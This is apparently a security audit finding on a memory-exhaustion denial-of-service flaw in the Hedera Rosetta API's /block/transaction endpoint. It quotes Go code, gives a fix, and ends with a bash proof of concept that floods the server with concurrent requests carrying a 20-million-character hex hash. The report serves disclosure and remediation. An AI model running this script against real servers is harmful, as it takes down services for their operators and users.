### Title
Unbounded Transaction Hash Causes Memory Exhaustion DoS in `/block/transaction`

### Summary
`BlockTransaction()` passes `request.TransactionIdentifier.Hash` directly to `FindByHashInBlock()` without any length validation. Inside `FindByHashInBlock()`, `hex.DecodeString` allocates a byte slice proportional to the input length with no upper bound. An unauthenticated attacker can send concurrent requests with arbitrarily large valid hex strings to exhaust server memory.

### Finding Description

**Exact code path:**

`BlockTransaction()` in `rosetta/app/services/block_service.go` (lines 87–92) passes the raw hash string directly:

```go
transaction, err := s.FindByHashInBlock(
    ctx,
    request.TransactionIdentifier.Hash,   // ← no length check
    block.ConsensusStartNanos,
    block.ConsensusEndNanos,
)
``` [1](#0-0) 

This reaches `transactionRepository.FindByHashInBlock()` in `rosetta/app/persistence/transaction.go` (line 180):

```go
transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
``` [2](#0-1) 

`SafeRemoveHexPrefix` only strips the `0x` prefix and performs no length check: [3](#0-2) 

`hex.DecodeString` allocates `len(input)/2` bytes. For a 100 MB hex string, this is a 50 MB allocation per request. The decoded byte slice is then transmitted as a `bytea` parameter to PostgreSQL: [4](#0-3) 

**Root cause:** No maximum length is enforced on `TransactionIdentifier.Hash` at any layer — not in `BlockTransaction()`, not in `FindByHashInBlock()`, and not in `SafeRemoveHexPrefix`. The only existing guard (`hex.DecodeString` returning an error for non-hex or odd-length input) does not reject oversized valid hex strings.

**Why existing checks fail:** The Rosetta SDK asserter validates that `TransactionIdentifier.Hash` is non-empty, but imposes no length limit. The Go HTTP server has no default body size limit. No middleware enforcing `http.MaxBytesReader` or equivalent was found anywhere in the Rosetta server code. [5](#0-4) 

### Impact Explanation
Each request with a 100 MB hex string causes ~50 MB of heap allocation in Go plus a large bytea value transmitted over the database connection. With 20 concurrent requests, this is ~1 GB of memory pressure. The server process can be OOM-killed or rendered unresponsive. The attack requires no authentication, no special privileges, and no prior knowledge beyond a valid block index (which is public sequential data).

### Likelihood Explanation
Any unprivileged external user can reach the `/block/transaction` endpoint. A valid `BlockIdentifier` (index + hash) is required to pass the first `FindByIdentifier` check, but block identifiers are publicly enumerable from the `/block` endpoint. The attacker only needs to know one valid block. The attack is trivially scriptable with standard HTTP tooling (e.g., `curl` or `ab`) and is fully repeatable.

### Recommendation
Add an explicit maximum length check on `request.TransactionIdentifier.Hash` before any processing. Valid Hedera transaction hashes are 48 bytes (96 hex chars) or 32 bytes (64 hex chars). Reject anything longer:

```go
const maxTransactionHashHexLen = 98 // 96 hex chars + optional "0x" prefix

func (s *blockAPIService) BlockTransaction(...) {
    if len(request.TransactionIdentifier.Hash) > maxTransactionHashHexLen {
        return nil, hErrors.ErrInvalidTransactionIdentifier
    }
    // ... existing logic
}
```

Additionally, enforce a request body size limit at the HTTP server level using `http.MaxBytesReader` in the server middleware.

### Proof of Concept

```bash
# 1. Obtain a valid block identifier
BLOCK=$(curl -s -X POST http://<rosetta-host>/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},"block_identifier":{"index":1}}')

BLOCK_INDEX=$(echo $BLOCK | jq '.block.block_identifier.index')
BLOCK_HASH=$(echo $BLOCK | jq -r '.block.block_identifier.hash')

# 2. Generate a 10 MB valid hex string (20,000,000 hex chars)
LONG_HASH=$(python3 -c "print('aa' * 10000000)")

# 3. Send concurrent requests with the oversized hash
for i in $(seq 1 50); do
  curl -s -X POST http://<rosetta-host>/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{
      \"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
      \"block_identifier\":{\"index\":$BLOCK_INDEX,\"hash\":\"$BLOCK_HASH\"},
      \"transaction_identifier\":{\"hash\":\"$LONG_HASH\"}
    }" &
done
wait

# Result: server memory exhausted; process OOM-killed or unresponsive
```

### Citations

**File:** rosetta/app/services/block_service.go (L77-102)
```go
func (s *blockAPIService) BlockTransaction(
	ctx context.Context,
	request *rTypes.BlockTransactionRequest,
) (*rTypes.BlockTransactionResponse, *rTypes.Error) {
	h := tools.SafeRemoveHexPrefix(request.BlockIdentifier.Hash)
	block, err := s.FindByIdentifier(ctx, request.BlockIdentifier.Index, h)
	if err != nil {
		return nil, err
	}

	transaction, err := s.FindByHashInBlock(
		ctx,
		request.TransactionIdentifier.Hash,
		block.ConsensusStartNanos,
		block.ConsensusEndNanos,
	)
	if err != nil {
		return nil, err
	}

	if err = s.updateOperationAccountAlias(ctx, transaction); err != nil {
		return nil, err
	}

	return &rTypes.BlockTransactionResponse{Transaction: transaction.ToRosetta()}, nil
}
```

**File:** rosetta/app/persistence/transaction.go (L180-183)
```go
	transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
	if err != nil {
		return nil, hErrors.ErrInvalidTransactionIdentifier
	}
```

**File:** rosetta/app/persistence/transaction.go (L188-193)
```go
	if err = db.Raw(
		selectTransactionsByHashInTimestampRange,
		sql.Named("hash", transactionHash),
		sql.Named("start", consensusStart),
		sql.Named("end", consensusEnd),
	).Find(&transactions).Error; err != nil {
```

**File:** rosetta/app/tools/hex.go (L17-23)
```go
// SafeRemoveHexPrefix - removes 0x prefix from a string if it has one
func SafeRemoveHexPrefix(string string) string {
	if strings.HasPrefix(string, HexPrefix) {
		return string[2:]
	}
	return string
}
```
